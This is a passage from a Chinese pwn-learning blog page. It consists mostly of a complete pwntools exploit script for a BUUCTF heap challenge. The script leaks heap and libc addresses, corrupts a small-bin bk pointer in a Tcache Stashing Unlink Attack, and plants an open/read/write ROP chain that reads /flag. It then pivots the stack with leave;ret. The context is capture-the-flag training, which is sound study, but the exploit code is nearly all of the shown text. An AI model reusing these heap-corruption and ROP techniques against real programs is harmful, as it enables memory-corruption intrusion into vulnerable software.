class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') <br><br>sh = process(<span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>)<br><span class="hljs-comment">#sh = remote('node4.buuoj.cn','27283')</span><br><br><span class="hljs-attribute">libc</span>=ELF("./libc-2.29.so")<br><br> <br> <br><br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims		    :sh.recvuntil(delims)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br> <br><br>def <span class="hljs-built_in">add</span>(index,chunk_size_index,value):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br>    ru(<span class="hljs-string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)<br>    sl(str(chunk_size_index))<br>    ru(<span class="hljs-string">'Please input content: '</span>)<br>    sl(value)<br><br>def free(index):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br><br>def <span class="hljs-built_in">edit</span>(index,value):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br>    ru(<span class="hljs-string">'Please input content: '</span>)<br>    sl(value)<br><br>def show(index):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'4'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br><br><br> <br><br><span class="hljs-comment">#1.0x10 2.0xf0 3.0x300 4.0x400</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(15,4,<span class="hljs-string">'Chunk_15'</span>)<br>    free(15)<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>    <span class="hljs-built_in">add</span>(14,2,<span class="hljs-string">'Chunk_14'</span>)<br>    free(14)<br><br><span class="hljs-comment">#dbg()</span><br><br>show(15)<br>last_chunk_addr = u64(ru(<span class="hljs-string">'\x0A'</span>).strip(<span class="hljs-string">'\x0A'</span>).ljust(8,<span class="hljs-string">'\x00'</span>))<br>lg(<span class="hljs-string">'last_chunk_addr'</span>,last_chunk_addr)<br>heap_addr = last_chunk_addr - 0x26C0<br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(1,4,<span class="hljs-string">'Chunk_1'</span>)<br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br>show(1)<br>libc_base = u64(ru(<span class="hljs-string">'\x0A'</span>).strip(<span class="hljs-string">'\x0A'</span>).ljust(8,<span class="hljs-string">'\x00'</span>)) - 0x1E4CA0<br>lg(<span class="hljs-string">'libc_base'</span>,libc_base)<br><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</span><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk</span><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk</span><br><span class="hljs-built_in">add</span>(2,4,<span class="hljs-string">'Chunk_2'</span>)<br><span class="hljs-comment">#申请一个chunk防止合并</span><br><span class="hljs-built_in">add</span>(13,4,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'\x00'</span>*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)<br><span class="hljs-built_in">edit</span>(2,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(3,2,<span class="hljs-string">'Chunk_3'</span>)<br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#ORW</span><br>pop_rdi_ret = libc_base + 0x0000000000026542<br>pop_rsi_ret = libc_base + 0x0000000000026f9e<br>pop_rdx_ret = libc_base + 0x000000000012bda6<br>file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置<br>flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容<br>ROP_chain  = <span class="hljs-string">'/flag\x00\x00\x00'</span><br><span class="hljs-comment">#open(file_name_addr,0)</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(file_name_addr)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(0)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'open'</span>])<br><span class="hljs-comment">#read(3,flag_addr,0x40)</span><br><span class="hljs-comment">#Read函数的第一个参数文件描述符从0开始累加，</span><br><span class="hljs-comment">#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，</span><br><span class="hljs-comment">#这样在程序中，每打开一个文件，文件描述符值从3开始累加。</span><br><span class="hljs-comment">#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件</span><br><span class="hljs-comment">#read函数第一个参数是3，就是在这个文件里读取数据。</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(3)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(flag_addr)<br>ROP_chain += p64(pop_rdx_ret)<br>ROP_chain += p64(0x40)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'read'</span>])<br><span class="hljs-comment">#write(1,flag_addr,0x40)</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(1)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(flag_addr)<br>ROP_chain += p64(pop_rdx_ret)<br>ROP_chain += p64(0x40)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'write'</span>])<br><br><span class="hljs-built_in">add</span>(4,4,ROP_chain)<br><br><span class="hljs-comment">#dbg()</span><br><br>leave_ret = libc_base + 0x0000000000058373<br>ru(<span class="hljs-string">'Your input: '</span>)<br>sl(<span class="hljs-string">'666'</span>)<br>ru(<span class="hljs-string">'What do you want to say?'</span>)<br><span class="hljs-comment">#栈迁移</span><br>sl(<span class="hljs-string">'A'</span><span class="hljs-number">*0</span>x80 + p64(file_name_addr) + p64(leave_ret))<br><br><span class="hljs-comment">#dbg()</span><br>itr()<br></code></pre></td></tr></tbody></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Orange/">← Next House of Orange</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Storm/">House of Storm Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Lore"><span class="toc-number">1.</span> <span class="toc-text">House of Lore</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tcache-Stashing-Unlink-Attack"><span class="toc-number">2.</span> <span class="toc-text">Tcache Stashing Unlink Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">攻击目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%89%8D%E6%8F%90"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">攻击前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.0.0.3.</span> <span class="toc-text">攻击原理</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-BUUCTF-2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-3"><span class="toc-number">3.</span> <span class="toc-text">例题 BUUCTF-[2020 新春红包题]3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">delete函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">3.5.</span> <span class="toc-text">show函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.</span> <span class="toc-text">栈溢出函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">调试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0tcache-bin"><span class="toc-number">5.1.</span> <span class="toc-text">构造tcache bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8unsorted-bin%E6%9E%84%E9%80%A0%E4%B8%A4%E4%B8%AAsmall-bin-chunk"><span class="toc-number">5.2.</span> <span class="toc-text">利用unsorted bin构造两个small bin chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9small-bin-chunk%E7%9A%84bk%E6%8C%87%E9%92%88%E4%B8%BAfirst-chunk-0x800"><span class="toc-number">5.3.</span> <span class="toc-text">修改small bin chunk的bk指针为first_chunk+0x800</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ORW%E7%9A%84ROP%E9%93%BE%E6%94%BE%E5%85%A5%E5%A0%86%E5%9D%97%E4%B8%AD"><span class="toc-number">5.4.</span> <span class="toc-text">构造ORW的ROP链放入堆块中</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">5.5.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">5.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>